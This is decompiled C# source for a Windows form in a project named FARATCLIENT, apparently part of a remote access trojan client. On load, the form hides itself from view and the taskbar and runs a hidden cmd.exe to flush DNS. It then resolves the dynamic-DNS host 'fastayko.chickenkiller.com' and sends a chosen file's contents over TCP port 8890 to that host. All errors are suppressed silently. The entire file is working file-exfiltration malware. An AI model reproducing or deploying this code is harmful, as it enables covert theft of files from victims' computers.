using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FARATCLIENT
{
	// Token: 0x02000009 RID: 9
	public partial class Form3 : Form
	{
		// Token: 0x06000034 RID: 52 RVA: 0x00007704 File Offset: 0x00005904
		public Form3(string FILENAME, string SHORTFILENAME)
		{
			Form3.fileName = FILENAME;
			Form3.shortFileName = SHORTFILENAME;
			this.InitializeComponent();
		}

		// Token: 0x06000035 RID: 53
		[DllImport("dnsapi.dll")]
		private static extern uint DnsFlushResolverCache();

		// Token: 0x06000036 RID: 54 RVA: 0x00007728 File Offset: 0x00005928
		private void Form3_Load(object sender, EventArgs e)
		{
			try
			{
				base.Hide();
				base.ShowInTaskbar = false;
				new Process
				{
					StartInfo = new ProcessStartInfo
					{
						WindowStyle = ProcessWindowStyle.Hidden,
						FileName = "cmd.exe",
						Arguments = "ipconfig /flushdns"
					}
				}.Start();
				uint num = Form3.DnsFlushResolverCache();
				string hostNameOrAddress = "fastayko.chickenkiller.com";
				IPAddress[] hostAddresses = Dns.GetHostAddresses(hostNameOrAddress);
				IPAddress[] array = hostAddresses;
				for (int i = 0; i < array.Length; i++)
				{
					IPAddress iPAddress = array[i];
					this.hostip = iPAddress.ToString();
				}
				string ipAddress = this.hostip;
				int port = int.Parse("8890");
				Task.Factory.StartNew(delegate
				{
					this.SendFile(ipAddress, port, Form3.fileName, Form3.shortFileName);
				});
				base.Close();
			}
			catch
			{
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00007824 File Offset: 0x00005A24
		public void SendFile(string remoteHostIP, int remoteHostPort, string longFileName, string shortFileName)
		{
			try
			{
				bool flag = !string.IsNullOrEmpty(remoteHostIP);
				if (flag)
				{
					byte[] bytes = Encoding.ASCII.GetBytes(shortFileName);
					byte[] array = File.ReadAllBytes(longFileName);
					byte[] array2 = new byte[4 + bytes.Length + array.Length];
					byte[] bytes2 = BitConverter.GetBytes(bytes.Length);
					bytes2.CopyTo(array2, 0);
					bytes.CopyTo(array2, 4);
					array.CopyTo(array2, 4 + bytes.Length);
					TcpClient tcpClient = new TcpClient(remoteHostIP, remoteHostPort);
					NetworkStream stream = tcpClient.GetStream();
					stream.Write(array2, 0, array2.GetLength(0));
					stream.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000043 RID: 67
		private static string fileName = "";

		// Token: 0x04000044 RID: 68
		private string hostip;

		// Token: 0x04000042 RID: 66
		private static string shortFileName = "";
	}
}
